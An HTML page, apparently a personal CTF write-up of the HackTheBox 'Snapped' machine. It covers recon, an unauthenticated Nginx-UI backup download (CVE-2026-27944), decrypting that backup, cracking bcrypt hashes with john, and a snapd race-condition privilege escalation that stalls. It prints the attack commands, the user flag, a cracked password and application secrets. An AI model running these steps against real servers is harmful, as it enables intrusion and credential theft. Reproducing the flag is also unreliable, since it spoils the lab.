@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Snapped | Privilege Escalation Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0a0c10;
+            --bg-card: #0f1115;
+            --bg-elevated: #15171d;
+            --accent-primary: #00d4ff;
+            --accent-secondary: #7b2eda;
+            --accent-success: #00ff9d;
+            --accent-warning: #ffaa33;
+            --accent-error: #ff3b6f;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a5b0;
+            --text-muted: #5a5f6e;
+            --border: #1e2229;
+            --font-mono: 'JetBrains Mono', monospace;
+            --font-sans: 'Inter', sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg-dark);
+            color: var(--text-secondary);
+            font-family: var(--font-sans);
+            line-height: 1.6;
+        }
+
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: radial-gradient(circle at 20% 50%, rgba(0, 212, 255, 0.08) 0%, rgba(123, 46, 218, 0.05) 50%, rgba(0, 0, 0, 0) 100%);
+        }
+
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(45deg, rgba(255,255,255,0.01) 0px, rgba(255,255,255,0.01) 2px, transparent 2px, transparent 8px);
+            pointer-events: none;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 3rem 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            box-shadow: 0 10px 30px -10px rgba(0,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary), var(--accent-primary));
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -1px;
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+        }
+
+        .target-info {
+            display: inline-block;
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid var(--accent-primary);
+            padding: 0.4rem 1.2rem;
+            border-radius: 40px;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            margin-top: 1rem;
+            color: var(--accent-primary);
+        }
+
+        section {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        section:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px -15px rgba(0,0,0,0.5);
+        }
+
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 2px solid var(--border);
+            display: inline-block;
+        }
+
+        h2 .section-icon {
+            margin-right: 0.5rem;
+            filter: drop-shadow(0 0 5px var(--accent-primary));
+        }
+
+        h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--accent-primary);
+            margin: 1.5rem 0 1rem 0;
+        }
+
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 1rem;
+        }
+
+        pre {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.2rem;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            position: relative;
+        }
+
+        pre::before {
+            content: '$';
+            position: absolute;
+            left: 1.2rem;
+            top: 1.2rem;
+            color: var(--accent-primary);
+            font-weight: 600;
+        }
+
+        pre code {
+            display: block;
+            padding-left: 1.5rem;
+            color: var(--accent-success);
+        }
+
+        .code-explanation {
+            background: rgba(0, 212, 255, 0.05);
+            border-left: 3px solid var(--accent-primary);
+            padding: 0.8rem 1.2rem;
+            margin: 0.5rem 0 1rem 0;
+            font-size: 0.85rem;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .inline-code {
+            font-family: var(--font-mono);
+            background: rgba(0, 212, 255, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            color: var(--accent-primary);
+        }
+
+        .flag-container {
+            display: flex;
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+            flex-wrap: wrap;
+        }
+
+        .flag-card {
+            flex: 1;
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.05), rgba(123, 46, 218, 0.05));
+            border: 1px solid var(--accent-primary);
+            border-radius: 12px;
+            padding: 1.2rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .flag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .flag-card:hover::before {
+            left: 100%;
+        }
+
+        .flag-label {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--accent-primary);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .flag-value {
+            font-family: var(--font-mono);
+            font-size: 1rem;
+            color: var(--text-primary);
+            margin-top: 0.5rem;
+            word-break: break-all;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-family: var(--font-mono);
+            font-weight: 600;
+        }
+
+        .status-success {
+            background: rgba(0, 255, 157, 0.15);
+            color: var(--accent-success);
+            border: 1px solid var(--accent-success);
+            box-shadow: 0 0 10px rgba(0, 255, 157, 0.2);
+        }
+
+        .status-pending {
+            background: rgba(255, 170, 51, 0.15);
+            color: var(--accent-warning);
+            border: 1px solid var(--accent-warning);
+        }
+
+        .status-blocked {
+            background: rgba(255, 59, 111, 0.15);
+            color: var(--accent-error);
+            border: 1px solid var(--accent-error);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        th {
+            text-align: left;
+            padding: 0.8rem;
+            border-bottom: 2px solid var(--border);
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        td {
+            padding: 0.8rem;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-secondary);
+        }
+
+        .note-info {
+            background: rgba(0, 212, 255, 0.05);
+            border-left: 3px solid var(--accent-primary);
+            padding: 1rem 1.2rem;
+            margin: 1rem 0;
+            border-radius: 0 12px 12px 0;
+        }
+
+        .note-warning {
+            background: rgba(255, 170, 51, 0.05);
+            border-left: 3px solid var(--accent-warning);
+            padding: 1rem 1.2rem;
+            margin: 1rem 0;
+            border-radius: 0 12px 12px 0;
+        }
+
+        .note-error {
+            background: rgba(255, 59, 111, 0.05);
+            border-left: 3px solid var(--accent-error);
+            padding: 1rem 1.2rem;
+            margin: 1rem 0;
+            border-radius: 0 12px 12px 0;
+        }
+
+        .progress-section {
+            margin: 1.5rem 0;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            font-size: 0.85rem;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: var(--bg-elevated);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 60%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        footer {
+            text-align: center;
+            padding-top: 2rem;
+            margin-top: 2rem;
+            border-top: 1px solid var(--border);
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1.5rem;
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            .flag-container {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="bg-animation"></div>
+
+<div class="container">
+     <header>
+        <a href="writeups.html" class="back-link">← Back to Writeups</a></div>
+     </header>
+    <header>
+        <h1>Snapped.htb</h1>
+        <div class="subtitle">HackTheBox — Linux / Hard — Privilege Escalation Deep Dive</div>
+        <div class="target-info">Target: 10.129.46.115 | Snapd: 2.63.1+24.04 (Vulnerable)</div>
+    </header>
+
+    <!-- Phase 1 - User Flag -->
+    <section>
+        <h2><span class="section-icon">[1]</span> Phase 1: Reconnaissance &amp; User Flag</h2>
+        
+        <h3>Initial Port Scan</h3>
+        <pre><code>sudo nmap -sCV -T4 10.129.46.115 -Pn</code></pre>
+        <div class="code-explanation">
+            <strong>Why <span class="inline-code">-sCV</span>?</strong> Combines <span class="inline-code">-sC</span> (default scripts) and <span class="inline-code">-sV</span> (version detection) to identify service versions — critical for matching CVEs.<br>
+            <strong>Why <span class="inline-code">-T4</span>?</strong> Faster timing template; aggressive but stable for CTF environments.<br>
+            <strong>Why <span class="inline-code">-Pn</span>?</strong> Skip host discovery (ICMP may be blocked); assumes target is up.
+        </div>
+
+        <p>Results showed ports 22 (SSH) and 80 (HTTP). The web server redirected to <code>snapped.htb</code>, requiring a hosts file entry.</p>
+
+        <pre><code>echo "10.129.46.115 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts</code></pre>
+
+        <h3>Subdomain Enumeration</h3>
+        <pre><code>ffuf -u http://10.129.46.115 -H "Host: FUZZ.snapped.htb" \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+     -ac -t 50</code></pre>
+        <div class="code-explanation">
+            <strong>Why <span class="inline-code">ffuf</span>?</strong> Fast, flexible fuzzer that tests virtual hosts by modifying the <span class="inline-code">Host</span> header.<br>
+            <strong>Why <span class="inline-code">-ac</span>?</strong> Auto-calibration automatically filters out false positives by learning response patterns.
+        </div>
+
+        <p>Discovered <code>admin.snapped.htb</code> — the Nginx-UI administrative panel.</p>
+    </section>
+
+    <!-- Phase 2 - CVE-2026-27944 -->
+    <section>
+        <h2><span class="section-icon">[2]</span> Phase 2: Exploiting CVE-2026-27944</h2>
+        <p>Nginx-UI versions up to 2.3.2 expose the <code>/api/backup</code> endpoint without authentication — a critical misconfiguration.</p>
+
+        <pre><code>curl -v http://admin.snapped.htb/api/backup -o backup.zip</code></pre>
+        <div class="code-explanation">
+            <strong>Why <span class="inline-code">-v</span>?</strong> Verbose output shows response headers, revealing the <span class="inline-code">X-Backup-Security</span> header containing the AES encryption key and IV.
+        </div>
+
+        <p>The backup contained three files: <code>hash_info.txt</code>, <code>nginx-ui.zip</code>, and <code>nginx.zip</code>. The <code>nginx-ui.zip</code> was AES-256-CBC encrypted.</p>
+
+        <pre><code># Extract key and IV as hex for OpenSSL
+KEY_HEX=$(echo "QCvgLBgbXhyX2HQDp87klWsyK4zgkDEFSAWgUWaCSq4=" | base64 -d | xxd -p -c 32)
+IV_HEX=$(echo "eR7i8ltmHUEO3fSixp4flQ==" | base64 -d | xxd -p -c 16)
+
+# Decrypt the inner zip
+openssl enc -d -aes-256-cbc -K $KEY_HEX -iv $IV_HEX -in nginx-ui.zip -out nginx-ui_dec.zip
+unzip nginx-ui_dec.zip -d nginx-ui</code></pre>
+        <div class="code-explanation">
+            <strong>Why convert to hex?</strong> OpenSSL expects the key and IV in hexadecimal format; <code>base64 -d</code> decodes from base64, then <code>xxd -p</code> converts to hex.
+        </div>
+
+        <h3>Extracting Credentials</h3>
+        <pre><code>sqlite3 nginx-ui/database.db "SELECT name, password FROM users;"</code></pre>
+        <p>The database contained bcrypt hashes for <code>admin</code> and <code>jonathan</code> users.</p>
+
+        <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt jonathan.hash</code></pre>
+        <div class="code-explanation">
+            <strong>Why bcrypt format?</strong> The hash begins with <code>$2a$10$</code>, identifying it as bcrypt with cost factor 10. John the Ripper handles this natively.
+        </div>
+
+        <div class="flag-container">
+            <div class="flag-card">
+                <div class="flag-label">USER FLAG</div>
+                <div class="flag-value">4a0dea293acad79da7d474f1dbf0b3e4</div>
+            </div>
+        </div>
+
+        <div class="note-info">
+            <strong>Credential Discovery:</strong> The cracked password for <code>jonathan</code> was <code>linkinpark</code> — a common weak password that appeared in the rockyou.txt wordlist.
+        </div>
+    </section>
+
+    <!-- Phase 3 - Privilege Escalation -->
+    <section>
+        <h2><span class="section-icon">[3]</span> Phase 3: Privilege Escalation — CVE-2026-3888</h2>
+        
+        <p>The target runs <code>snapd 2.63.1+24.04</code> — confirmed vulnerable to the snap-confine race condition.</p>
+
+        <pre><code>snap version
+snap    2.63.1+24.04
+snapd   2.63.1+24.04
+series  16
+ubuntu  24.04</code></pre>
+
+        <h3>Understanding the Vulnerability</h3>
+        <p>CVE-2026-3888 is a Time-Of-Check Time-Of-Use (TOCTOU) race in <code>snap-confine</code>'s bind-mount sequence. <code>systemd-tmpfiles</code> periodically deletes stale directories in <code>/tmp</code>, including <code>/tmp/.snap</code>. By replacing this directory during the race window, an attacker can inject a malicious dynamic linker that executes as root.</p>
+
+        <div class="note-warning">
+            <strong>Crucial Requirement:</strong> The vulnerability only triggers when <code>systemd-tmpfiles</code> actually runs. On Ubuntu 24.04, this is configured with a 30-day interval by default.
+        </div>
+
+        <h3>Exploit Preparation</h3>
+        <pre><code># On Kali — compile the exploit
+gcc -O2 -static -o exploit exploit_suid.c
+gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
+
+# Transfer to target
+scp exploit librootshell.so jonathan@10.129.46.115:/tmp/
+
+# On target
+cd /tmp
+chmod +x exploit librootshell.so
+./exploit librootshell.so</code></pre>
+        <div class="code-explanation">
+            <strong>Why <span class="inline-code">-static</span>?</strong> Static linking ensures the exploit runs independently of target libraries — critical when the target may have missing dependencies.<br>
+            <strong>Why <span class="inline-code">-nostdlib</span>?</strong> The malicious library uses raw syscalls; including the standard library would add unnecessary overhead and potential detection vectors.
+        </div>
+
+        <div class="note-error">
+            <strong>Error Encountered:</strong> <code>renameat2: No such file or directory</code><br>
+            <strong>Diagnosis:</strong> The exploit expects <code>/tmp/.snap</code> to be deleted by <code>systemd-tmpfiles</code> before racing. Checking the journal revealed the timer had never fired.
+        </div>
+
+        <pre><code>journalctl -u systemd-tmpfiles-clean | tail -20
+-- No entries --</code></pre>
+
+        <div class="note-warning">
+            <strong>Root Cause: The 30-Day Cleanup Timer</strong><br>
+            On Ubuntu 24.04, <code>systemd-tmpfiles-clean.timer</code> is configured with <code>OnCalendar=monthly</code> (30 days). A freshly booted machine hasn't triggered this cleanup yet — the race window doesn't exist.
+        </div>
+    </section>
+
+    <!-- Phase 4 - Alternative Investigation -->
+    <section>
+        <h2><span class="section-icon">[4]</span> Phase 4: Alternative Investigation</h2>
+        
+        <p>While the snapd race was blocked, further enumeration revealed the Nginx-UI configuration and database.</p>
+
+        <pre><code>cat /usr/local/etc/nginx-ui/app.ini</code></pre>
+
+        <p>The configuration contained several secrets worth noting:</p>
+        <ul style="margin-left: 2rem; margin-bottom: 1rem;">
+            <li><code class="inline-code">JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9</code></li>
+            <li><code class="inline-code">Secret = 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6</code></li>
+            <li><code class="inline-code">Node.Secret = c64d7ca1-19cb-4ebe-96d4-49037e7df78e</code></li>
+        </ul>
+
+        <p>The database contained an admin bcrypt hash:</p>
+        <pre><code>$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm</code></pre>
+        
+        <div class="note-info">
+            <strong>Why bcrypt is slow:</strong> The cost factor (10) means 2^10 = 1024 rounds of key derivation. This is designed to slow down brute-force attacks. Cracking this hash may take hours depending on hardware.
+        </div>
+    </section>
+
+    <!-- Progress Tracker -->
+    <section>
+        <h2><span class="section-icon">[5]</span> Progress Tracker</h2>
+        
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Reconnaissance and User Flag</span>
+                <span class="status-success status-badge">Complete</span>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" style="width: 100%"></div></div>
+        </div>
+
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Admin Hash Cracking</span>
+                <span class="status-pending status-badge">In Progress</span>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" style="width: 65%"></div></div>
+        </div>
+
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Snapd Race Exploit</span>
+                <span class="status-blocked status-badge">Blocked (30d Timer)</span>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" style="width: 0%"></div></div>
+        </div>
+
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Root Flag</span>
+                <span class="status-pending status-badge">Pending</span>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" style="width: 0%"></div></div>
+        </div>
+    </section>
+
+    <!-- Key Takeaways -->
+    <section>
+        <h2><span class="section-icon">[6]</span> Key Takeaways</h2>
+        
+        <div class="note-info">
+            <strong>CVE-2026-27944</strong> — Nginx-UI's backup endpoint is completely unauthenticated. Always audit API endpoints when reviewing web applications.
+        </div>
+        
+        <div class="note-info">
+            <strong>SQLite Database Extraction</strong> — Embedded databases often contain credential hashes. Always check for <code>.db</code> or <code>.sqlite</code> files in extracted backups.
+        </div>
+        
+        <div class="note-info">
+            <strong>Password Cracking</strong> — <code>rockyou.txt</code> remains the most effective wordlist for CTF environments. bcrypt requires patience — cost factors of 10+ mean 1000+ rounds per hash.
+        </div>
+        
+        <div class="note-warning">
+            <strong>CVE-2026-3888</strong> — The snapd race condition has a hidden prerequisite: <code>systemd-tmpfiles</code> must have cleaned <code>/tmp/.snap</code> at least once. On Ubuntu 24.04, this is a 30-day interval. Always check <code>systemctl cat systemd-tmpfiles-clean.timer</code> before attempting this exploit.
+        </div>
+        
+        <div class="note-info">
+            <strong>Tool Choice Matters</strong> — <code>-sCV</code> saved time by combining script execution and version detection; <code>-ac</code> in ffuf reduced false positives significantly.
+        </div>
+    </section>
+
+    <!-- Tools Used -->
+    <section>
+        <h2><span class="section-icon">[7]</span> Tools Used</h2>
+        <div style="display: flex; flex-wrap: wrap; gap: 0.75rem; margin-top: 1rem;">
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">nmap</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">ffuf</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">curl</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">openssl</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">sqlite3</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">base64</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">john</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">hashcat</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">scp</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">gcc</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">systemd-tmpfiles</span>
+            <span class="status-badge" style="background: rgba(0,212,255,0.1); border-color: var(--accent-primary);">journalctl</span>
+        </div>
+    </section>
+
+    <footer>
+        Writeup by cyb3r3lla · HTB Snapped · Last Updated April 2026<br>
+        Root pending: Exploit requires 30-day system timer or alternative privesc vector
+    </footer>
+</div>
+</body>
+</html>
